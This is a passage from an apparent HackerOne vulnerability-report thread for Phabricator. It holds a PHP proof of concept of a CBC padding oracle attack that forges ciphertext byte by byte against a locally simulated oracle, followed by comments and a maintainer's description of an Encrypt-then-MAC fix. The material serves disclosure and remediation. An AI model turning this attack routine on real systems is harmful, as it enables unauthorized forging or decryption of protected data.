class=\"nf\"\u003eoracle_encrypt_attack_block\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$tail_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$plain_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$evil_block\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Performing oracle encryption attack against target block...\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003earray_fill\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"o\"\u003e--\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$raw_value\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$pad_value\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"nv\"\u003e$try_head\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"nv\"\u003e$known_value\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$plain_block\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$evil_value\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$evil_block\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e\u003cspan class=\"o\"\u003e--\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nv\"\u003e$attack_value\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$plain_block\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$pad_value\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n      \u003cspan class=\"nv\"\u003e$try_head\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$attack_value\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"nv\"\u003e$solved\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$guess_byte\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$guess_byte\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e255\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$guess_byte\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nv\"\u003e$guess_value\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$raw_value\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$guess_byte\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$pad_value\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$known_value\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$evil_value\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n      \u003cspan class=\"nv\"\u003e$try_head\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$guess_value\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n      \u003cspan class=\"nv\"\u003e$ok\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003equery_oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$try_head\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$tail_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ok\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$solved\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n          \u003cspan class=\"s2\"\u003e\u0026quot;Solved byte %d.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n          \u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$try_head\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pad_value\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e \u003cspan class=\"nv\"\u003e$evil_value\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n        \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nv\"\u003e$solved\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"k\"\u003edie\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Unable to solve byte \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e// Convert the plaintext back to a string and return it.\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eforeach\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ord\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e \u003cspan class=\"o\"\u003e.=\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ord\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003equery_oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$guess\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;key\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;iv\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$ok\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopenssl_decrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$guess\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eCIPHER\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eOPENSSL_RAW_DATA\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ok\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eget_random_bytes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$length\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$src\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003efopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/dev/urandom\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;rb\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$src\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003edie\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Failed to open /dev/urandom.\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003efread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$src\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$length\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$result\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003edie\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Failed to read /dev/urandom.\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"nb\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$src\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eprint_section\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$header\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$body\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$binary\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$header\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$binary\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"nb\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$body\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nb\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0x%02x \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$body\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e\u003cspan class=\"p\"\u003e]));\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$body\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-03-30T17:35:21.265Z","updated_at":"2017-03-30T17:35:21.265Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1577263,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Very nice CBC padding oracle attack demonstration. When I find time, I will play around with your PoC and see how much I can speed up the attack.","markdown_message":"\u003cp\u003eVery nice CBC padding oracle attack demonstration. When I find time, I will play around with your PoC and see how much I can speed up the attack.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-01T09:34:55.769Z","updated_at":"2017-04-01T09:34:55.769Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1579017,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just to follow up quickly since I didn't get this fixed on the optimistic timeline I was hoping to above: this is still near the top of my TODO list, some other stuff has just been cropping up so I haven't made it here yet. I still expect to fix this in the short term.","markdown_message":"\u003cp\u003eJust to follow up quickly since I didn\u0026#39;t get this fixed on the optimistic timeline I was hoping to above: this is still near the top of my TODO list, some other stuff has just been cropping up so I haven\u0026#39;t made it here yet. I still expect to fix this in the short term.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-02T16:35:16.926Z","updated_at":"2017-04-02T16:35:16.926Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1585639,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I believe this should now be resolved at HEAD of `master`:\n\nhttps://secure.phabricator.com/D17625\nhttps://secure.phabricator.com/rP63828f580689b7799d8d38ed4604e91385f33505\nhttps://secure.phabricator.com/T12470\n\nBriefly, I've implemented Encrypt-then-MAC for encrypted files, hashing both the encrypted data and the IV to generate an integrity hash. Unencrypted files also get a basic integrity hash of the file data.\n\nIn both cases, we refuse to decrypt or serve file data if the stored integrity hash does not match a freshly computed integrity hash after we perform a read from the underlying storage engine, so execution never reaches the decryption step and the process can no longer serve as a padding oracle.\n\nI plan to make some other followup changes (like providing CLI tools for related maintenance) and we'll offer further guidance in the weekly changelog, but none of the additional work needs to hold up resolving this issue.\n\nIf you have a chance to review the fix, please let us know if you catch any issues with it.","markdown_message":"\u003cp\u003eI believe this should now be resolved at HEAD of \u003ccode\u003emaster\u003c/code\u003e:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://secure.phabricator.com/D17625\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FD17625\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/D17625\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://secure.phabricator.com/rP63828f580689b7799d8d38ed4604e91385f33505\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FrP63828f580689b7799d8d38ed4604e91385f33505\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/rP63828f580689b7799d8d38ed4604e91385f33505\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://secure.phabricator.com/T12470\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FT12470\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/T12470\u003c/span\u003e\u003ci 